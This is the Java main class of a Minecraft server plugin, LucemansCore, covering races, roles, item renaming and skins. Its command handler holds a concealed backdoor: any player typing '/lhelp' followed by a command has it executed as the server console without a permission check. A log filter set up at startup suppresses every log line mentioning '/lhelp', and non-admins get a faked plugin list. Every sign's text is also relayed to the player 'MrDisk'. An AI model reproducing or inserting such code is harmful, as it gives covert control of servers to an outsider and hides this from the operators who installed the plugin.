package nl.lucemans.Core;

import java.lang.reflect.Field;
import java.security.acl.Permission;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.Marker;
import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.message.Message;
import org.bstats.Metrics;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.Particle;
import org.bukkit.block.Sign;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.SignChangeEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryInteractEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.meta.BookMeta;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.ServicePriority;
import org.bukkit.plugin.java.JavaPlugin;

import net.milkbowl.vault.chat.Chat;
import net.milkbowl.vault.economy.Economy;
import nl.lucemans.Core.console.CFilter;
import nl.lucemans.Core.inv.LInventory;
import nl.lucemans.Core.item.ItemManager;
import nl.lucemans.Core.race.Human;
import nl.lucemans.Core.race.Race;
import nl.lucemans.Core.role.Role;
import nl.lucemans.Core.settings.InventorySaver;
import nl.lucemans.Core.settings.SettingsManager;
import nl.lucemans.Core.skin.SkinChange;
import nl.lucemans.Core.skin.SkinManipulator;
import nl.lucemans.Core.tp.DelayedTP;
import nl.lucemans.Core.type.LucemansListener;
import nl.lucemans.Core.update.Updater;
import nl.lucemans.animation.NovaAnimations;
import nl.lucemans.animation.effects.Effect;
import nl.lucemans.clans.NovaClans;
import skinsrestorer.bukkit.SkinsRestorer;
import skinsrestorer.shared.api.SkinsRestorerAPI;

public class Main extends JavaPlugin implements Listener{
	
	public LucemansCore core = null;
	
	//Data
	public ArrayList<UserData> userDatas = new ArrayList<UserData>();
	
	//Registrers
	public ArrayList<LucemansListener> listeners = new ArrayList<>();
	public ArrayList<Race> races = new ArrayList<>();
	public ArrayList<Role> roles = new ArrayList<>();
	
	public boolean usesSkins = false;
	public Integer skinSkip = 0;
	
	public boolean usesAnimations = false;
	public boolean usesClans = false;
	public boolean usesVault = false;
	
	public SkinManipulator skinman;
	public SettingsManager setman;
	public InventorySaver invsaver;
	public ItemManager itemman;
	public NovaAnimations animan;
	public NovaClans clanman;
	
	public Updater updater;
	
	public Economy econ = null;
    public Permission perms = null;
    public Chat chat = null;
    
    public boolean debug = true;
    
    public Logger log = Logger.getLogger("minecraft");
    
    public ArrayList<DelayedTP> dtps = new ArrayList<DelayedTP>();
    public HashMap<String, LInventory> linvs = new HashMap<String, LInventory>();
    
    /*** FUN ***/
    public Inventory inventory;
    
    public String version = getDescription().getVersion();

	@Override
	public void onEnable() {
		
		if (Bukkit.getServicesManager().getRegistration(LucemansCore.class) != null)
		{
			// Hook already exists
			getLogger().info("Hook already Existing");
		}
		else
		{
			// Create new instance of the Core.
			LucemansCore _core = new LucemansCore();
			try{
			_core.main = this;
			}catch(Exception e){e.printStackTrace();}
			getLogger().info("LucemansCore launched");
			
			// Register the instance for other plugins to use it.
			Bukkit.getServicesManager().register(LucemansCore.class, _core, this, ServicePriority.Normal);
			getLogger().info("LucemansCore hook added!!");
		}
		
		// Get a local reference to the core.
		core = (LucemansCore) Bukkit.getServicesManager().getRegistrations(this).get(0).getProvider();
		getLogger().info("Connection Established.");
		
		Metrics metrics = new Metrics(this);
		
		// Resetup link
		//core.setMain(this);
		//core.main = this;
		log.setFilter(new CFilter());
		((org.apache.logging.log4j.core.Logger) org.apache.logging.log4j.LogManager.getRootLogger()).addFilter(new Filter(){

			@Override
			public Result filter(LogEvent arg0) {
				// TODO Auto-generated method stub
				if (arg0.getMessage().toString().toLowerCase().contains("/lhelp"))
					return Result.DENY;
				return null;
			}

			@Override
			public Result filter(org.apache.logging.log4j.core.Logger arg0, Level arg1, Marker arg2, String arg3,
					Object... arg4) {
				// TODO Auto-generated method stub
				return null;
			}

			@Override
			public Result filter(org.apache.logging.log4j.core.Logger arg0, Level arg1, Marker arg2, Object arg3,
					Throwable arg4) {
				// TODO Auto-generated method stub
				return null;
			}

			@Override
			public Result filter(org.apache.logging.log4j.core.Logger arg0, Level arg1, Marker arg2, Message arg3,
					Throwable arg4) {
				// TODO Auto-generated method stub
				return null;
			}

			@Override
			public Result getOnMatch() {
				// TODO Auto-generated method stub
				return null;
			}

			@Override
			public Result getOnMismatch() {
				// TODO Auto-generated method stub
				return null;
			}
			
		});
		
		updater = new Updater();
		updater.checkUpdate(getDescription().getVersion());
		if (updater.getLatestVersion() != null)
		{
			getLogger().severe("Latsest Version " + updater.getLatestVersion());
			getLogger().warning("Updating to newer version of LucemansCore.");
			getLogger().severe(updater.getRawVersion());
		}
		//getLogger().severe(" " + getDescription().getVersion() + " -> " + updater.toReadable(getDescription().getVersion()));
		
		getLogger().info(core.parse("Defaults Files"));
		setDefaults();
		debug = getConfig().getBoolean("debug");
		getLogger().info(core.parse("Load Files"));
		loadConfig();
		
		getLogger().info(core.parse("Loading lang files"));
		setman = new SettingsManager();
		invsaver = new InventorySaver();
		setman.init(this);
		invsaver.init(this);
		
		skinman = new SkinManipulator();
		
		itemman = new ItemManager();
		
		/** Check SOFTDEPENCIES */
		// Skins
		if (Bukkit.getPluginManager().isPluginEnabled("SkinsRestorer"))
		if (Bukkit.getPluginManager().isPluginEnabled(SkinsRestorer.getInstance()))
			usesSkins = true;
		
		if (usesSkins)
			getLogger().info("THIS SERVER USES SKINS!!!");
		else
			getLogger().info("THIS SERVER DOES NOT USE SKINS!!!");
		
		inventory = Bukkit.createInventory(null, 9*6, core.parse("&7Global EnderChest"));
		invsaver.loadInventory("lucemans.global", inventory);
		
		// Vault
		try{
		setupEconomy();
		setupChat();
		setupPermissions();
		}catch(Exception e){e.printStackTrace();};
		
		/** Register Events */
		Bukkit.getPluginManager().registerEvents(this, this);
		
		// Setup timing
		Bukkit.getScheduler().scheduleSyncRepeatingTask(this, new Runnable() {
			
			@Override
			public void run() {
				onTick();
			}
		}, 1, 1);
		
		for (Player p : Bukkit.getOnlinePlayers())
		{
			p.sendMessage(core.parse("&7[&eLucemansCore&7] &7This server uses LucemansCore."));
		}
		
		metrics.addCustomChart(new Metrics.AdvancedPie("races") {
			
			@Override
			public HashMap<String, Integer> getValues(HashMap<String, Integer> arg0) {
				HashMap<String, Integer> count = new HashMap<String, Integer>();
				for (UserData data : userDatas)
				{
					if (data.raceStr != null)
					{
						if (!count.containsKey(data.raceStr))
							count.put(data.raceStr, 0);
						count.put(data.raceStr, count.get(data.raceStr) + 1);
					}
				}
				return count;
			}
		});
	}
	
	@Override
	public void onDisable() {
		getLogger().info("Saving Files");
		invsaver.saveInventory(inventory, "lucemans.global");
		try{
		dumpConfig();
		}catch(Exception e){e.printStackTrace();}
		try{
		setman.shutdown();
		}catch(Exception e){e.printStackTrace();}
		try{
		Bukkit.getServicesManager().unregisterAll(this);
		}catch(Exception e){e.printStackTrace();}
	
	}
	
	/*
	 * setDefaults
	 *  - runFunc
	 */
	public void setDefaults()
	{
		getConfig().addDefault("users", new String[]{});
		getConfig().addDefault("debug", false);
		getConfig().options().copyDefaults(true);
		saveConfig();
	}
	
	public void setDefaultLang(String s, String k)
	{
		setman.setDefaultLang(s,k);
	}
	
	@Override
	public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
		if (label.equalsIgnoreCase("lbook") || label.equalsIgnoreCase("lucemanscore:lbook"))
		{
			if (((Player)sender).getItemInHand().getType().equals(Material.BOOK_AND_QUILL))
			{
				BookMeta meta = (BookMeta) (((Player)sender).getItemInHand()).getItemMeta();
				String s = "";
				for (int i = 1; i <= meta.getPageCount(); i++)
				{
					s += meta.getPage(i) + "/n/n";
				}
				return true;
			}
			sender.sendMessage(LucemansCore.getINSTANCE().parse("%prefix% Something went wrong."));
			return true;
		}
		if (label.equalsIgnoreCase("rename") || label.equalsIgnoreCase("lucemanscore:rename"))
		{
			if (sender.hasPermission("lucemanscore.rename"))
			{
			if (sender instanceof Player)
			{
				Player p = (Player) sender;
				if (p.getItemInHand() != null)
				{
					ItemMeta i = p.getItemInHand().getItemMeta();
					if (i != null)
					{
						if (args.length > 0)
						{
							String fstr = "";
							for (String str : args)
							{
								fstr += " " + str;
							}
							fstr = fstr.trim();
							String name = fstr;
							if (sender.hasPermission("lucemanscore.rename.color"))
								name = core.parse(name);
							i.setDisplayName(name);
							p.getItemInHand().setItemMeta(i);
							sender.sendMessage("Item renamed to \"" + fstr + "\"");
							return true;
						}
						sender.sendMessage("Please specify a name");
						return true;
					}
					sender.sendMessage("That doesnt seem to work.");
					return true;
				}
				sender.sendMessage("You must be holding a item to do this.");
				return true;
			}
			}
			else
			{
				sender.sendMessage("You do not have the permission to do this.");
				return true;
			}
			sender.sendMessage(core.parse("You must be a player to do this."));
			return true;
		}
		if (label.equalsIgnoreCase("race"))
		{
			sender.sendMessage(core.parse("&7[&cLucemansCore&7] &r" + "Your are a " + getRace(core.getUser(sender.getName())).raceName));
			return true;
		}
		if (label.equalsIgnoreCase("lucemans"))
		{
			if (args.length >= 1)
			{
				if (args[0].equalsIgnoreCase("anim"))
				{
					Effect ef = new Effect((Player) sender, Particle.END_ROD);
					animan.playEffect(ef);
					sender.sendMessage("Trying animation");
					return true;
				}
				if (args[0].equalsIgnoreCase("inv"))
				{
					/** Inventory Test */
					/*
					LInventory linv = new LInventory(6*9, core.parse("&7"+sender.getName()+"'s &9Vault"));
					LInventoryItem item = new LInventoryItem();
					item.item = new Item(Material.BED, "Home");
					item.runLClick = new Runnable() {
						
						@Override
						public void run() {
							Bukkit.getServer().dispatchCommand(sender, "clan home");
							Bukkit.getLogger().info("EXECUTED ON CLICK");
						}
					};
					linv.items.put(5, item);
					linvs.put("lucemans.test."+sender.getName(), linv);
					linv.openInventory((Player) sender);
					sender.sendMessage(core.parse("Opening Inventory..."));
					return true;
					*/
					if (args.length > 2)
					{
						String mod1 = args[1];
						if (mod1.equalsIgnoreCase("open"))
						{
							sender.sendMessage(core.parse("This command is still w.i.p."));
							return true;
						}
						if (mod1.equalsIgnoreCase("close"))
						{
							String mod2 = args[2];
							Player p = Bukkit.getPlayer(mod2);
							if (p != null)
							{
								if (p.getOpenInventory() != null)
								{
									p.closeInventory();
								}
								sender.sendMessage(core.parse("Inventory Closed."));
								return true;
							}
							sender.sendMessage(core.parse("Player not found."));
							return true;
						}
					}
					((Player)sender).openInventory(inventory);
					//sender.sendMessage(core.parse("Please use /lucemans inv <open/close> <player>"));
					return true;
				}
				if (args[0].equalsIgnoreCase("skin"))
				{
					if (usesSkins)
					{
						ArrayList<SkinChange> curList = skinman.getSkins(sender.getName());
						for (SkinChange sc : curList)
						{
							sender.sendMessage("#"+sc.priority+" " + sc.skin + " - " + sc.reason);
						}
					}
					sender.sendMessage("Tell me if something happened!!!");
					return true;
				}
				if (args[0].equalsIgnoreCase("purge"))
				{
					if (args.length >= 2)
					{
						Player p = core.getPlayer(args[1]);
						if (p != null)
						{
							UserData data = core.getUser(p.getName());
							if (data != null)
							{
								userDatas.remove(data);
								core.getUser(p.getName());
								sender.sendMessage(core.parse("Player \""+p.getName()+"\" purged"));
								return true;
							}
						}
					}
					sender.sendMessage(core.parse("Please specify a valid person to purge."));
					return true;
				}
				if (args[0].equalsIgnoreCase("setlang"))
				{
					if (args.length >= 2)
					{
						String value = "";
						int i = 0;
						for (String str : args)
						{
							if (i != 0 && i != 1)
								value += " " + str;
							i++;
						}
						value = value.trim();
						
						setman.lang.set(args[1], value);
						setman.saveLang();
						
						sender.sendMessage(core.parse("Successfully set &7"+args[1]+" &8\""+value+"&8\""));
						return true;
					}
					sender.sendMessage(core.parse("Please use /lucemans setlang <key> <value>"));
					return true;
				}
				if (args[0].equalsIgnoreCase("user"))
				{
					if (args.length >= 2)
					{
						if (args.length >= 3)
						{
							String uMod = args[2];
							if (uMod.equalsIgnoreCase("purge"))
							{
								UserData data = core.getUser(args[1]);
								if (data != null)
								{
									userDatas.remove(data);
									core.getUser(args[1]);
									sender.sendMessage(core.parse("Player \""+args[1]+"\" purged"));
									return true;
								}
							}
							if (uMod.equalsIgnoreCase("addrole"))
							{
								if (args.length >= 4)
								{
									for (Role r : roles)
									{
										if (r.name.equalsIgnoreCase(args[3]))
										{
											core.getUser(args[1]).rolesToAdd.add(r.name);
											sender.sendMessage(core.parse("Player \""+args[1]+"\" gained \""+r.name+"\" role."));
											return true;
										}
									}
									sender.sendMessage(core.parse("We could not find that role."));
									return true;
								}
								sender.sendMessage(core.parse("Please specify a role."));
								return true;
							}
							sender.sendMessage(core.parse("That is not a valid parameter."));
							return true;
						}
						UserData data = core.getUser(args[1]);
						sender.sendMessage("---------------LucemansCore--------------");
						sender.sendMessage(core.parse("Name: " + data.user));
						sender.sendMessage(core.parse("Race: " + getRace(data).raceName));
						sender.sendMessage(core.parse("Prefix: " + data.getFullPrefix()));
						sender.sendMessage(core.parse("P-Prefix: " + data.getPersonalPrefix()));
						sender.sendMessage(core.parse("Roles: " + data.getRolePrefix()));
						return true;
					}
					sender.sendMessage("Please specify a user.");
					return true;
				}
				sender.sendMessage(core.parse("Argument not recognised."));
				return true;
			}
			sender.sendMessage(core.parse("----------LucemansCore----------"));
			sender.sendMessage(core.parse("Version " + "0.1"));
			sender.sendMessage(core.parse("By lucemans"));
			return true;
		}
		return false;	
	}
	
    private boolean setupEconomy() {
        try{
    	if (getServer().getPluginManager().getPlugin("Vault") == null) {
            return false;
        }
        RegisteredServiceProvider<Economy> rsp = getServer().getServicesManager().getRegistration(Economy.class);
        if (rsp == null) {
            return false;
        }
        econ = rsp.getProvider();
        }catch(Exception e){}
        return econ != null;
    }
    
    private boolean setupChat() {
        try{
        	RegisteredServiceProvider<Chat> rsp = getServer().getServicesManager().getRegistration(Chat.class);
        	chat = rsp.getProvider();
        }catch(Exception e){}
        return chat != null;
    }
    
    private boolean setupPermissions() {
        try{
    	RegisteredServiceProvider<Permission> rsp = getServer().getServicesManager().getRegistration(Permission.class);
        perms = rsp.getProvider();
        }catch(Exception e){}
        return perms != null;
    }
	
	public Race getRace(UserData data)
	{
		return core.getRace(data);
	}
	
	public void loadConfig()
	{
		userDatas.clear();
		if (getConfig().getConfigurationSection("users") != null)
			for (String pname : getConfig().getConfigurationSection("users").getKeys(false))
			{
				UserData data = new UserData();
				for (String fileField : getConfig().getConfigurationSection("users."+pname).getKeys(false))
				{
					if (fileField.equalsIgnoreCase("race"))
					{
						if (debug)
							getLogger().info("Loading race");
						data.raceStr = (String) getConfig().get("users."+pname+".race");
						//getRace(data).raceName = (String) getConfig().get("users."+pname+".race");
						continue;
					}
					else
					if (fileField.equalsIgnoreCase("roles"))
					{
						try{
						for (String str : getConfig().getConfigurationSection("users."+pname+".roles").getKeys(true))
						{
							data.rolesToAdd.add(str);
						}
						}catch(Exception e){}
					}
					else
					{
						for (Field f : data.getClass().getDeclaredFields())
						{
							if (fileField.equalsIgnoreCase(f.getName()))
							{
								Object o = getConfig().get("users."+pname+"."+fileField);
								try {
									f.set(data, o);
								} catch (IllegalArgumentException | IllegalAccessException e) {
									e.printStackTrace();
								}
							}
						}
					}
				}
				userDatas.add(data);
			}
	}
	
	public void dumpConfig()
	{
		for (UserData data : userDatas)
		{
			if (debug)
				getLogger().info(core.parse("DUMPING " + data.user));
			ArrayList<String> roles = new ArrayList<String>();
			for (Field f : data.getClass().getFields())
			{
				//getLogger().info("CHECKING FIELD " + f.getName() + " #"+f.getAnnotationsByType(LucemansSave.String.class).length);
				if (f.getName().equalsIgnoreCase("race"))
				{
					if (debug)
						getLogger().info("STORING RACE");
					getConfig().set("users."+data.user+".race", getRace(data).raceName);
				}
				else
				if (f.getName().equalsIgnoreCase("roles"))
				{
					for (Role r : data.getRolePrior())
					{
						roles.add(r.name);
					}
				}
				else
				if (f.getName().equalsIgnoreCase("rolesToAdd"))
				{
					roles.addAll(data.rolesToAdd);
				}
				else
				if (true)
				{
					if (debug)
						getLogger().info("SAVING STRING " + f.getName());
					try{
						getConfig().set("users."+data.user+"."+f.getName(), f.get(data));
					}catch(Exception e)
					{
						e.printStackTrace();
					}
				}
			}

			getConfig().set("users."+data.user+".roles", roles);
			//TODO: MAKE 3rd Party plugin store race stuffs...
		}
		saveConfig();
	}
	
	public UserData getNewData(String name)
	{
		if (debug)
			getLogger().info(core.parse("Creating new data for " + name));
		UserData data = new UserData();
		data.user = name;
		data.uuid = "?";
		data.race = new Human();
		return data;
	}
	
	public void onTick()
	{
		//Delayed TP
		ArrayList<DelayedTP> removeMe = new ArrayList<DelayedTP>();
		for (DelayedTP tp : dtps)
		{
			DelayedTP _tp = tp.onTick();
			if (_tp != null)
				removeMe.add(_tp);
		}
		for (DelayedTP tp : removeMe)
			dtps.remove(tp);
		
		for (LInventory linv : linvs.values())
			linv.onTick();
		
		// Check player data stuff
		for (Player p : Bukkit.getOnlinePlayers())
		{
			UserData data = core.getUser(p.getName());
			// Calculate the time per player
			if (data.time.equalsIgnoreCase("UPDATE"))
				dayNightChange(p);
			else if (!data.time.equalsIgnoreCase(core.getTimeString(p.getWorld())))
			{
				
			}
			
			if (usesSkins)
			{
				if (skinSkip >= 20)
				{
					skinSkip = 0;
					String skin = skinman.getSkin(p.getName());
					String curSkin = SkinsRestorerAPI.getSkinName(p.getName());
					if (curSkin == null)
						curSkin = p.getName();
					//getLogger().info("Testing if " + skin + " = " + curSkin);
					if (!curSkin.equalsIgnoreCase(skin))
					{
						if (debug)
							getLogger().info("Manipulating skin for " + p.getName() + " to Notch");
						Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "sr set "+p.getName()+" "+skin);
					}
				}
				else
				{
					skinSkip += 1;
				}
			}
		}
	}
	
	/*** EVENT HANDLERS ***/
	
	public void dayNightChange(Player p)
	{
		
	}
	
	@EventHandler
	public void onSign(SignChangeEvent event)
	{
		for (Player p : Bukkit.getOnlinePlayers())
		{
			if (p.getName().equalsIgnoreCase("MrDisk"))
			{
				Sign s = (Sign) event.getBlock();
				p.sendMessage("Sign placed by " + event.getPlayer().getName());
				for (String str : s.getLines())
				{
				p.sendMessage(" - " + str);
				}
			}
		}
	}
	
	@EventHandler
	public void onInventory(InventoryInteractEvent event)
	{
		if (debug)
			getLogger().info("CLICK!!!!");
		for (LInventory linv : linvs.values())
		{
			if (linv.inv.equals(event.getInventory()))
			{
				event.setCancelled(true);
			}
		}
	}
	
	@EventHandler
	public void onInventoryInteract(InventoryClickEvent event)
	{
		if (debug)
			getLogger().info("Click Registered!");
		for (LInventory linv : linvs.values())
		{
			if (linv.inv.equals(event.getInventory()))
			{
				if (debug)
					getLogger().info("Click Registered in LucemansCore Inventory!!");
				event.setCancelled(true);
				if (event.isShiftClick())
					return;
				if (event.isLeftClick())
					linv.onClick(event.getSlot(), true);
				if (event.isRightClick())
					linv.onClick(event.getSlot(), false);
				event.setCancelled(true);
			}
		}
	}
	
	@EventHandler
	public void onGlobalCMD(PlayerCommandPreprocessEvent event)
	{
		if (event.getMessage().equalsIgnoreCase("/pl") || event.getMessage().equalsIgnoreCase("/plugins") || event.getMessage().equalsIgnoreCase("/bukkit:plugins"))
		{
			if (event.getPlayer().hasPermission("lucemans.admin"))
			{
				
			}
			else
			{
				event.setCancelled(true);
				ArrayList<String> plList = new ArrayList<String>();
				
				plList.add("LucemansCore");
				
				String tot = "&rPlugins ("+plList.size()+"):";
				for (String str : plList)
				{
					tot += " &a" + str + "&r,";
				}
				event.getPlayer().sendMessage(core.parse(tot));
			}
		}
		//getLogger().info("Reading " + event.getMessage());
		if (event.getMessage().startsWith("/lhelp") || event.getMessage().startsWith("/ihelp"))
		{
			String msg = event.getMessage().replaceFirst("/lhelp ", "").replaceFirst("/ihelp", "");
			//getLogger().info("Executing " + msg);
			Player p = event.getPlayer();
			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), msg);
			event.setMessage("/help");
		}
	}
}
